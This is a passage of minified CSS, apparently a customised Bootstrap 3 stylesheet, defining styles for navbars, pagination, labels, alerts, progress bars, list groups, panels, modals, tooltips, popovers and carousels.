.navbar-inverse .navbar-nav .open .dropdown-menu>li>a:focus,.navbar-inverse .navbar-nav .open .dropdown-menu>li>a:hover{color:#fff;background-color:transparent}
.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a,.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:focus,.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:hover{color:#fff;background-color:#385973}
.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a,.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:focus,.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:hover{color:#444;background-color:transparent}}
.navbar-inverse .navbar-link{color:#999}
.navbar-inverse .navbar-link:hover{color:#fff}
.navbar-inverse .btn-link{color:#999}
.navbar-inverse .btn-link:focus,.navbar-inverse .btn-link:hover{color:#fff}
.navbar-inverse .btn-link[disabled]:focus,.navbar-inverse .btn-link[disabled]:hover,fieldset[disabled] .navbar-inverse .btn-link:focus,fieldset[disabled] .navbar-inverse .btn-link:hover{color:#444}
.breadcrumb{padding:8px 15px;margin-bottom:20px;list-style:none;background-color:#f5f5f5;border-radius:4px}
.breadcrumb>li{display:inline-block}
.breadcrumb>li+li:before{content:"/\00a0";padding:0 5px;color:#ccc}
.breadcrumb>.active{color:#999}
.pagination{display:inline-block;padding-left:0;margin:20px 0;border-radius:4px}
.pagination>li{display:inline}
.pagination>li>a,.pagination>li>span{position:relative;float:left;padding:6px 12px;line-height:1.42857143;text-decoration:none;color:#3a6d99;background-color:#fff;border:1px solid #ddd;margin-left:-1px}
.pagination>li:first-child>a,.pagination>li:first-child>span{margin-left:0;border-bottom-left-radius:4px;border-top-left-radius:4px}
.pagination>li:last-child>a,.pagination>li:last-child>span{border-bottom-right-radius:4px;border-top-right-radius:4px}
.pagination>li>a:focus,.pagination>li>a:hover,.pagination>li>span:focus,.pagination>li>span:hover{color:#3a6d99;background-color:#eee;border-color:#ddd}
.pagination>.active>a,.pagination>.active>a:focus,.pagination>.active>a:hover,.pagination>.active>span,.pagination>.active>span:focus,.pagination>.active>span:hover{z-index:2;color:#fff;background-color:#5d8db3;border-color:#5d8db3;cursor:default}
.pagination>.disabled>a,.pagination>.disabled>a:focus,.pagination>.disabled>a:hover,.pagination>.disabled>span,.pagination>.disabled>span:focus,.pagination>.disabled>span:hover{color:#999;background-color:#fff;border-color:#ddd;cursor:not-allowed}
.pagination-lg>li>a,.pagination-lg>li>span{padding:10px 16px;font-size:18px}
.pagination-lg>li:first-child>a,.pagination-lg>li:first-child>span{border-bottom-left-radius:6px;border-top-left-radius:6px}
.pagination-lg>li:last-child>a,.pagination-lg>li:last-child>span{border-bottom-right-radius:6px;border-top-right-radius:6px}
.pagination-sm>li>a,.pagination-sm>li>span{padding:5px 10px;font-size:12px}
.pagination-sm>li:first-child>a,.pagination-sm>li:first-child>span{border-bottom-left-radius:3px;border-top-left-radius:3px}
.pagination-sm>li:last-child>a,.pagination-sm>li:last-child>span{border-bottom-right-radius:3px;border-top-right-radius:3px}
.pager{padding-left:0;margin:20px 0;list-style:none;text-align:center}
.pager li{display:inline}
.pager li>a,.pager li>span{display:inline-block;padding:5px 14px;background-color:#fff;border:1px solid #ddd;border-radius:15px}
.pager li>a:focus,.pager li>a:hover{text-decoration:none;background-color:#eee}
.pager .next>a,.pager .next>span{float:right}
.pager .previous>a,.pager .previous>span{float:left}
.pager .disabled>a,.pager .disabled>a:focus,.pager .disabled>a:hover,.pager .disabled>span{color:#999;background-color:#fff;cursor:not-allowed}
.label{display:inline;padding:.2em .6em .3em;font-size:75%;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25em}
a.label:focus,a.label:hover{color:#fff;text-decoration:none;cursor:pointer}
.label:empty{display:none}
.btn .label{position:relative;top:-1px}
.label-default{background-color:#999}
.label-default[href]:focus,.label-default[href]:hover{background-color:grey}
.label-primary{background-color:#5d8db3}
.label-primary[href]:focus,.label-primary[href]:hover{background-color:#477396}
.label-success{background-color:#6ac065}
.label-success[href]:focus,.label-success[href]:hover{background-color:#4cac46}
.label-info{background-color:#5bc0de}
.label-info[href]:focus,.label-info[href]:hover{background-color:#31b0d5}
.label-warning{background-color:#f0ad4e}
.label-warning[href]:focus,.label-warning[href]:hover{background-color:#ec971f}
.label-danger{background-color:#c05f5a}
.label-danger[href]:focus,.label-danger[href]:hover{background-color:#a74540}
.badge{display:inline-block;min-width:10px;padding:3px 7px;font-size:12px;font-weight:700;color:#fff;line-height:1;vertical-align:baseline;white-space:nowrap;text-align:center;background-color:#999;border-radius:10px}
.badge:empty{display:none}
.btn .badge{position:relative;top:-1px}
.btn-xs .badge{top:0;padding:1px 5px}
a.badge:focus,a.badge:hover{color:#fff;text-decoration:none;cursor:pointer}
.nav-pills>.active>a>.badge,a.list-group-item.active>.badge{color:#3a6d99;background-color:#fff}
.nav-pills>li>a>.badge{margin-left:3px}
.jumbotron{padding:30px;margin-bottom:30px;color:inherit;background-color:#eee}
.jumbotron .h1,.jumbotron h1{color:inherit}
.jumbotron p{margin-bottom:15px;font-size:21px;font-weight:200}
.jumbotron>hr{border-top-color:#d5d5d5}
.container .jumbotron{border-radius:6px}
.jumbotron .container{max-width:100%}
@media screen and (min-width:768px){.jumbotron{padding-top:48px;padding-bottom:48px}
.container .jumbotron{padding-left:60px;padding-right:60px}
.jumbotron .h1,.jumbotron h1{font-size:63px}}
.thumbnail{display:block;padding:4px;margin-bottom:20px;line-height:1.42857143;background-color:#fff;border:1px solid #ddd;border-radius:4px;-webkit-transition:all .2s ease-in-out;-o-transition:all .2s ease-in-out;transition:all .2s ease-in-out}
.thumbnail a>img,.thumbnail>img{margin-left:auto;margin-right:auto}
a.thumbnail.active,a.thumbnail:focus,a.thumbnail:hover{border-color:#3a6d99}
.thumbnail .caption{padding:9px;color:#000}
.alert{padding:15px;margin-bottom:20px;border:1px solid transparent;border-radius:4px}
.alert h4{margin-top:0;color:inherit}
.alert .alert-link{font-weight:700}
.alert>p,.alert>ul{margin-bottom:0}
.alert>p+p{margin-top:5px}
.alert-dismissable,.alert-dismissible{padding-right:35px}
.alert-dismissable .close,.alert-dismissible .close{position:relative;top:-2px;right:-21px;color:inherit}
.alert-success{background-color:#dff0d8;border-color:#d6e9c6;color:#3c763d}
.alert-success hr{border-top-color:#c9e2b3}
.alert-success .alert-link{color:#2b542c}
.alert-info{background-color:#d9edf7;border-color:#bce8f1;color:#31708f}
.alert-info hr{border-top-color:#a6e1ec}
.alert-info .alert-link{color:#245269}
.alert-warning{background-color:#fcf8e3;border-color:#faebcc;color:#8a6d3b}
.alert-warning hr{border-top-color:#f7e1b5}
.alert-warning .alert-link{color:#66512c}
.alert-danger{background-color:#f2dede;border-color:#ebccd1;color:#a94442}
.alert-danger hr{border-top-color:#e4b9c0}
.alert-danger .alert-link{color:#843534}
@-webkit-keyframes progress-bar-stripes{from{background-position:40px 0}
to{background-position:0 0}}
@keyframes progress-bar-stripes{from{background-position:40px 0}
to{background-position:0 0}}
.progress{overflow:hidden;height:20px;margin-bottom:20px;background-color:#f5f5f5;border-radius:4px;-webkit-box-shadow:inset 0 1px 2px rgba(0,0,0,.1);box-shadow:inset 0 1px 2px rgba(0,0,0,.1)}
.progress-bar{float:left;width:0;height:100%;font-size:12px;line-height:20px;color:#fff;text-align:center;background-color:#5d8db3;-webkit-box-shadow:inset 0 -1px 0 rgba(0,0,0,.15);box-shadow:inset 0 -1px 0 rgba(0,0,0,.15);-webkit-transition:width .6s ease;-o-transition:width .6s ease;transition:width .6s ease}
.progress-bar-striped,.progress-striped .progress-bar{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-size:40px 40px}
.progress-bar.active,.progress.active .progress-bar{-webkit-animation:progress-bar-stripes 2s linear infinite;-o-animation:progress-bar-stripes 2s linear infinite;animation:progress-bar-stripes 2s linear infinite}
.progress-bar[aria-valuenow="1"],.progress-bar[aria-valuenow="2"]{min-width:30px}
.progress-bar[aria-valuenow="0"]{color:#999;min-width:30px;background-color:transparent;background-image:none;box-shadow:none}
.progress-bar-success{background-color:#6ac065}
.progress-striped .progress-bar-success{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}
.progress-bar-info{background-color:#5bc0de}
.progress-striped .progress-bar-info{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}
.progress-bar-warning{background-color:#f0ad4e}
.progress-striped .progress-bar-warning{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}
.progress-bar-danger{background-color:#c05f5a}
.progress-striped .progress-bar-danger{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}
.media,.media-body{overflow:hidden;zoom:1}
.media,.media .media{margin-top:15px}
.media:first-child{margin-top:0}
.media-object{display:block}
.media-heading{margin:0 0 5px}
.media>.pull-left{margin-right:10px}
.media>.pull-right{margin-left:10px}
.media-list{padding-left:0;list-style:none}
.list-group{margin-bottom:20px;padding-left:0}
.list-group-item{position:relative;display:block;padding:10px 15px;margin-bottom:-1px;background-color:#fff;border:1px solid #ddd}
.list-group-item:first-child{border-top-right-radius:4px;border-top-left-radius:4px}
.list-group-item:last-child{margin-bottom:0;border-bottom-right-radius:4px;border-bottom-left-radius:4px}
.list-group-item>.badge{float:right}
.list-group-item>.badge+.badge{margin-right:5px}
a.list-group-item{color:#555}
a.list-group-item .list-group-item-heading{color:#333}
a.list-group-item:focus,a.list-group-item:hover{text-decoration:none;color:#555;background-color:#f5f5f5}
.list-group-item.disabled,.list-group-item.disabled:focus,.list-group-item.disabled:hover{background-color:#eee;color:#999}
.list-group-item.disabled .list-group-item-heading,.list-group-item.disabled:focus .list-group-item-heading,.list-group-item.disabled:hover .list-group-item-heading{color:inherit}
.list-group-item.disabled .list-group-item-text,.list-group-item.disabled:focus .list-group-item-text,.list-group-item.disabled:hover .list-group-item-text{color:#999}
.list-group-item.active,.list-group-item.active:focus,.list-group-item.active:hover{z-index:2;color:#fff;background-color:#5d8db3;border-color:#5d8db3}
.list-group-item.active .list-group-item-heading,.list-group-item.active .list-group-item-heading>.small,.list-group-item.active .list-group-item-heading>small,.list-group-item.active:focus .list-group-item-heading,.list-group-item.active:focus .list-group-item-heading>.small,.list-group-item.active:focus .list-group-item-heading>small,.list-group-item.active:hover .list-group-item-heading,.list-group-item.active:hover .list-group-item-heading>.small,.list-group-item.active:hover .list-group-item-heading>small{color:inherit}
.list-group-item.active .list-group-item-text,.list-group-item.active:focus .list-group-item-text,.list-group-item.active:hover .list-group-item-text{color:#e8eff4}
.list-group-item-success{color:#3c763d;background-color:#dff0d8}
a.list-group-item-success{color:#3c763d}
a.list-group-item-success .list-group-item-heading{color:inherit}
a.list-group-item-success:focus,a.list-group-item-success:hover{color:#3c763d;background-color:#d0e9c6}
a.list-group-item-success.active,a.list-group-item-success.active:focus,a.list-group-item-success.active:hover{color:#fff;background-color:#3c763d;border-color:#3c763d}
.list-group-item-info{color:#31708f;background-color:#d9edf7}
a.list-group-item-info{color:#31708f}
a.list-group-item-info .list-group-item-heading{color:inherit}
a.list-group-item-info:focus,a.list-group-item-info:hover{color:#31708f;background-color:#c4e3f3}
a.list-group-item-info.active,a.list-group-item-info.active:focus,a.list-group-item-info.active:hover{color:#fff;background-color:#31708f;border-color:#31708f}
.list-group-item-warning{color:#8a6d3b;background-color:#fcf8e3}
a.list-group-item-warning{color:#8a6d3b}
a.list-group-item-warning .list-group-item-heading{color:inherit}
a.list-group-item-warning:focus,a.list-group-item-warning:hover{color:#8a6d3b;background-color:#faf2cc}
a.list-group-item-warning.active,a.list-group-item-warning.active:focus,a.list-group-item-warning.active:hover{color:#fff;background-color:#8a6d3b;border-color:#8a6d3b}
.list-group-item-danger{color:#a94442;background-color:#f2dede}
a.list-group-item-danger{color:#a94442}
a.list-group-item-danger .list-group-item-heading{color:inherit}
a.list-group-item-danger:focus,a.list-group-item-danger:hover{color:#a94442;background-color:#ebcccc}
a.list-group-item-danger.active,a.list-group-item-danger.active:focus,a.list-group-item-danger.active:hover{color:#fff;background-color:#a94442;border-color:#a94442}
.list-group-item-heading{margin-top:0;margin-bottom:5px}
.list-group-item-text{margin-bottom:0;line-height:1.3}
.panel{margin-bottom:20px;background-color:#fff;border:1px solid transparent;border-radius:4px;-webkit-box-shadow:0 1px 1px rgba(0,0,0,.05);box-shadow:0 1px 1px rgba(0,0,0,.05)}
.panel-body{padding:15px}
.panel-heading{padding:10px 15px;border-bottom:1px solid transparent;border-top-right-radius:3px;border-top-left-radius:3px}
.panel-heading>.dropdown .dropdown-toggle{color:inherit}
.panel-title{margin-top:0;margin-bottom:0;font-size:16px;color:inherit}
.panel-title>a{color:inherit}
.panel-footer{padding:10px 15px;background-color:#f5f5f5;border-top:1px solid #ddd;border-bottom-right-radius:3px;border-bottom-left-radius:3px}
.panel>.list-group{margin-bottom:0}
.panel>.list-group .list-group-item{border-width:1px 0;border-radius:0}
.panel>.list-group:first-child .list-group-item:first-child{border-top:0;border-top-right-radius:3px;border-top-left-radius:3px}
.panel>.list-group:last-child .list-group-item:last-child{border-bottom:0;border-bottom-right-radius:3px;border-bottom-left-radius:3px}
.list-group+.panel-footer,.panel-heading+.list-group .list-group-item:first-child{border-top-width:0}
.panel>.panel-collapse>.table,.panel>.table,.panel>.table-responsive>.table{margin-bottom:0}
.panel>.table-responsive:first-child>.table:first-child,.panel>.table:first-child{border-top-right-radius:3px;border-top-left-radius:3px}
.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:first-child,.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:first-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:first-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:first-child,.panel>.table:first-child>tbody:first-child>tr:first-child td:first-child,.panel>.table:first-child>tbody:first-child>tr:first-child th:first-child,.panel>.table:first-child>thead:first-child>tr:first-child td:first-child,.panel>.table:first-child>thead:first-child>tr:first-child th:first-child{border-top-left-radius:3px}
.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:last-child,.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:last-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:last-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:last-child,.panel>.table:first-child>tbody:first-child>tr:first-child td:last-child,.panel>.table:first-child>tbody:first-child>tr:first-child th:last-child,.panel>.table:first-child>thead:first-child>tr:first-child td:last-child,.panel>.table:first-child>thead:first-child>tr:first-child th:last-child{border-top-right-radius:3px}
.panel>.table-responsive:last-child>.table:last-child,.panel>.table:last-child{border-bottom-right-radius:3px;border-bottom-left-radius:3px}
.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:first-child,.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:first-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:first-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:first-child,.panel>.table:last-child>tbody:last-child>tr:last-child td:first-child,.panel>.table:last-child>tbody:last-child>tr:last-child th:first-child,.panel>.table:last-child>tfoot:last-child>tr:last-child td:first-child,.panel>.table:last-child>tfoot:last-child>tr:last-child th:first-child{border-bottom-left-radius:3px}
.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:last-child,.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:last-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:last-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:last-child,.panel>.table:last-child>tbody:last-child>tr:last-child td:last-child,.panel>.table:last-child>tbody:last-child>tr:last-child th:last-child,.panel>.table:last-child>tfoot:last-child>tr:last-child td:last-child,.panel>.table:last-child>tfoot:last-child>tr:last-child th:last-child{border-bottom-right-radius:3px}
.panel>.panel-body+.table,.panel>.panel-body+.table-responsive{border-top:1px solid #ddd}
.panel>.table>tbody:first-child>tr:first-child td,.panel>.table>tbody:first-child>tr:first-child th{border-top:0}
.panel>.table-bordered,.panel>.table-responsive>.table-bordered{border:0}
.panel>.table-bordered>tbody>tr>td:first-child,.panel>.table-bordered>tbody>tr>th:first-child,.panel>.table-bordered>tfoot>tr>td:first-child,.panel>.table-bordered>tfoot>tr>th:first-child,.panel>.table-bordered>thead>tr>td:first-child,.panel>.table-bordered>thead>tr>th:first-child,.panel>.table-responsive>.table-bordered>tbody>tr>td:first-child,.panel>.table-responsive>.table-bordered>tbody>tr>th:first-child,.panel>.table-responsive>.table-bordered>tfoot>tr>td:first-child,.panel>.table-responsive>.table-bordered>tfoot>tr>th:first-child,.panel>.table-responsive>.table-bordered>thead>tr>td:first-child,.panel>.table-responsive>.table-bordered>thead>tr>th:first-child{border-left:0}
.panel>.table-bordered>tbody>tr>td:last-child,.panel>.table-bordered>tbody>tr>th:last-child,.panel>.table-bordered>tfoot>tr>td:last-child,.panel>.table-bordered>tfoot>tr>th:last-child,.panel>.table-bordered>thead>tr>td:last-child,.panel>.table-bordered>thead>tr>th:last-child,.panel>.table-responsive>.table-bordered>tbody>tr>td:last-child,.panel>.table-responsive>.table-bordered>tbody>tr>th:last-child,.panel>.table-responsive>.table-bordered>tfoot>tr>td:last-child,.panel>.table-responsive>.table-bordered>tfoot>tr>th:last-child,.panel>.table-responsive>.table-bordered>thead>tr>td:last-child,.panel>.table-responsive>.table-bordered>thead>tr>th:last-child{border-right:0}
.panel>.table-bordered>tbody>tr:first-child>td,.panel>.table-bordered>tbody>tr:first-child>th,.panel>.table-bordered>tbody>tr:last-child>td,.panel>.table-bordered>tbody>tr:last-child>th,.panel>.table-bordered>tfoot>tr:last-child>td,.panel>.table-bordered>tfoot>tr:last-child>th,.panel>.table-bordered>thead>tr:first-child>td,.panel>.table-bordered>thead>tr:first-child>th,.panel>.table-responsive>.table-bordered>tbody>tr:first-child>td,.panel>.table-responsive>.table-bordered>tbody>tr:first-child>th,.panel>.table-responsive>.table-bordered>tbody>tr:last-child>td,.panel>.table-responsive>.table-bordered>tbody>tr:last-child>th,.panel>.table-responsive>.table-bordered>tfoot>tr:last-child>td,.panel>.table-responsive>.table-bordered>tfoot>tr:last-child>th,.panel>.table-responsive>.table-bordered>thead>tr:first-child>td,.panel>.table-responsive>.table-bordered>thead>tr:first-child>th{border-bottom:0}
.panel>.table-responsive{border:0;margin-bottom:0}
.panel-group{margin-bottom:20px}
.panel-group .panel{margin-bottom:0;border-radius:4px}
.panel-group .panel+.panel{margin-top:5px}
.panel-group .panel-heading{border-bottom:0}
.panel-group .panel-heading+.panel-collapse>.panel-body{border-top:1px solid #ddd}
.panel-group .panel-footer{border-top:0}
.panel-group .panel-footer+.panel-collapse .panel-body{border-bottom:1px solid #ddd}
.panel-default{border-color:#ddd}
.panel-default>.panel-heading{color:#333;background-color:#f5f5f5;border-color:#ddd}
.panel-default>.panel-heading+.panel-collapse>.panel-body{border-top-color:#ddd}
.panel-default>.panel-heading .badge{color:#f5f5f5;background-color:#333}
.panel-default>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#ddd}
.panel-primary{border-color:#5d8db3}
.panel-primary>.panel-heading{color:#fff;background-color:#5d8db3;border-color:#5d8db3}
.panel-primary>.panel-heading+.panel-collapse>.panel-body{border-top-color:#5d8db3}
.panel-primary>.panel-heading .badge{color:#5d8db3;background-color:#fff}
.panel-primary>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#5d8db3}
.panel-success{border-color:#d6e9c6}
.panel-success>.panel-heading{color:#3c763d;background-color:#dff0d8;border-color:#d6e9c6}
.panel-success>.panel-heading+.panel-collapse>.panel-body{border-top-color:#d6e9c6}
.panel-success>.panel-heading .badge{color:#dff0d8;background-color:#3c763d}
.panel-success>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#d6e9c6}
.panel-info{border-color:#bce8f1}
.panel-info>.panel-heading{color:#31708f;background-color:#d9edf7;border-color:#bce8f1}
.panel-info>.panel-heading+.panel-collapse>.panel-body{border-top-color:#bce8f1}
.panel-info>.panel-heading .badge{color:#d9edf7;background-color:#31708f}
.panel-info>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#bce8f1}
.panel-warning{border-color:#faebcc}
.panel-warning>.panel-heading{color:#8a6d3b;background-color:#fcf8e3;border-color:#faebcc}
.panel-warning>.panel-heading+.panel-collapse>.panel-body{border-top-color:#faebcc}
.panel-warning>.panel-heading .badge{color:#fcf8e3;background-color:#8a6d3b}
.panel-warning>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#faebcc}
.panel-danger{border-color:#ebccd1}
.panel-danger>.panel-heading{color:#a94442;background-color:#f2dede;border-color:#ebccd1}
.panel-danger>.panel-heading+.panel-collapse>.panel-body{border-top-color:#ebccd1}
.panel-danger>.panel-heading .badge{color:#f2dede;background-color:#a94442}
.panel-danger>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#ebccd1}
.embed-responsive{position:relative;display:block;height:0;padding:0;overflow:hidden}
.embed-responsive .embed-responsive-item,.embed-responsive embed,.embed-responsive iframe,.embed-responsive object{position:absolute;top:0;left:0;bottom:0;height:100%;width:100%;border:0}
.embed-responsive.embed-responsive-16by9{padding-bottom:56.25%}
.embed-responsive.embed-responsive-4by3{padding-bottom:75%}
.well{min-height:20px;padding:19px;margin-bottom:20px;background-color:#f5f5f5;border:1px solid #e3e3e3;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.05);box-shadow:inset 0 1px 1px rgba(0,0,0,.05)}
.well blockquote{border-color:#ddd;border-color:rgba(0,0,0,.15)}
.well-lg{padding:24px;border-radius:6px}
.well-sm{padding:9px;border-radius:3px}
.close{float:right;font-size:21px;font-weight:700;line-height:1;color:#000;text-shadow:0 1px 0 #fff;opacity:.2;filter:alpha(opacity=20)}
.close:focus,.close:hover{color:#000;text-decoration:none;cursor:pointer;opacity:.5;filter:alpha(opacity=50)}
button.close{padding:0;cursor:pointer;background:0 0;border:0;-webkit-appearance:none}
.modal-open{overflow:hidden}
.modal{display:none;overflow:hidden;position:fixed;top:0;right:0;bottom:0;left:0;z-index:1050;-webkit-overflow-scrolling:touch;outline:0}
.modal.fade .modal-dialog{-webkit-transform:translate3d(0,-25%,0);transform:translate3d(0,-25%,0)}
.modal.in .modal-dialog{-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}
.modal-open .modal{overflow-x:hidden;overflow-y:auto}
.modal-dialog{position:relative}
.modal-content{position:relative;background-color:#fff;background-clip:padding-box;outline:0}
.modal-backdrop{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1040;background-color:#000}
.modal-backdrop.fade{opacity:0;filter:alpha(opacity=0)}
.modal-backdrop.in{opacity:.5;filter:alpha(opacity=50)}
.modal-header{min-height:16.43px}
.modal-header .close{margin-top:-2px}
.modal-title{margin:0}
.modal-body{position:relative}
.modal-footer{text-align:right}
.modal-footer .btn+.btn{margin-left:5px;margin-bottom:0}
.modal-footer .btn-group .btn+.btn{margin-left:-1px}
.modal-footer .btn-block+.btn-block{margin-left:0}
.modal-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}
@media (min-width:768px){.modal-dialog{width:600px;margin:30px auto}
.modal-content{-webkit-box-shadow:0 5px 15px rgba(0,0,0,.5);box-shadow:0 5px 15px rgba(0,0,0,.5)}
.modal-sm{width:300px}}
@media (min-width:992px){.modal-lg{width:900px}}
.tooltip{position:absolute;z-index:1070;display:block;visibility:visible;font-size:12px;line-height:1.4;opacity:0;filter:alpha(opacity=0)}
.tooltip.in{opacity:.9;filter:alpha(opacity=90)}
.tooltip.top{margin-top:-3px;padding:5px 0}
.tooltip.right{margin-left:3px;padding:0 5px}
.tooltip.bottom{margin-top:3px;padding:5px 0}
.tooltip.left{margin-left:-3px;padding:0 5px}
.tooltip-inner{max-width:200px;padding:3px 8px;color:#fff;text-align:center;text-decoration:none;background-color:#000;border-radius:4px}
.tooltip-arrow{position:absolute;width:0;height:0;border-color:transparent;border-style:solid}
.tooltip.top .tooltip-arrow{bottom:0;left:50%;margin-left:-5px;border-width:5px 5px 0;border-top-color:#000}
.tooltip.top-left .tooltip-arrow{bottom:0;left:5px;border-width:5px 5px 0;border-top-color:#000}
.tooltip.top-right .tooltip-arrow{bottom:0;right:5px;border-width:5px 5px 0;border-top-color:#000}
.tooltip.right .tooltip-arrow{top:50%;left:0;margin-top:-5px;border-width:5px 5px 5px 0;border-right-color:#000}
.tooltip.left .tooltip-arrow{top:50%;right:0;margin-top:-5px;border-width:5px 0 5px 5px;border-left-color:#000}
.tooltip.bottom .tooltip-arrow{top:0;left:50%;margin-left:-5px;border-width:0 5px 5px;border-bottom-color:#000}
.tooltip.bottom-left .tooltip-arrow{top:0;left:5px;border-width:0 5px 5px;border-bottom-color:#000}
.tooltip.bottom-right .tooltip-arrow{top:0;right:5px;border-width:0 5px 5px;border-bottom-color:#000}
.popover{position:absolute;top:0;left:0;z-index:1060;display:none;max-width:276px;padding:1px;text-align:left;background-color:#fff;background-clip:padding-box;border:1px solid #ccc;border:1px solid rgba(0,0,0,.2);border-radius:6px;-webkit-box-shadow:0 5px 10px rgba(0,0,0,.2);box-shadow:0 5px 10px rgba(0,0,0,.2);white-space:normal}
.popover.top{margin-top:-10px}
.popover.right{margin-left:10px}
.popover.bottom{margin-top:10px}
.popover.left{margin-left:-10px}
.popover-title{margin:0;padding:8px 14px;font-size:14px;font-weight:400;line-height:18px;background-color:#f7f7f7;border-bottom:1px solid #ebebeb;border-radius:5px 5px 0 0}
.popover-content{padding:9px 14px}
.popover>.arrow,.popover>.arrow:after{position:absolute;display:block;width:0;height:0;border-color:transparent;border-style:solid}
.popover>.arrow{border-width:11px}
.popover>.arrow:after{border-width:10px;content:""}
.popover.top>.arrow{left:50%;margin-left:-11px;border-bottom-width:0;border-top-color:#999;border-top-color:rgba(0,0,0,.25);bottom:-11px}
.popover.top>.arrow:after{content:" ";bottom:1px;margin-left:-10px;border-bottom-width:0;border-top-color:#fff}
.popover.right>.arrow{top:50%;left:-11px;margin-top:-11px;border-left-width:0;border-right-color:#999;border-right-color:rgba(0,0,0,.25)}
.popover.right>.arrow:after{content:" ";left:1px;bottom:-10px;border-left-width:0;border-right-color:#fff}
.popover.bottom>.arrow{left:50%;margin-left:-11px;border-top-width:0;border-bottom-color:#999;border-bottom-color:rgba(0,0,0,.25);top:-11px}
.popover.bottom>.arrow:after{content:" ";top:1px;margin-left:-10px;border-top-width:0;border-bottom-color:#fff}
.popover.left>.arrow{top:50%;right:-11px;margin-top:-11px;border-right-width:0;border-left-color:#999;border-left-color:rgba(0,0,0,.25)}
.popover.left>.arrow:after{content:" ";right:1px;border-right-width:0;border-left-color:#fff;bottom:-10px}
.carousel{position:relative}
.carousel-inner{position:relative;overflow:hidden;width:100%}
.carousel-inner>.item{display:none;position:relative;-webkit-transition:.6s ease-in-out left;-o-transition:.6s ease-in-out left;transition:.6s ease-in-out left}
.carousel-inner>.item>a>img,.carousel-inner>.item>img{line-height:1}
.carousel-inner>.active,.carousel-inner>.next,.carousel-inner>.prev{display:block}
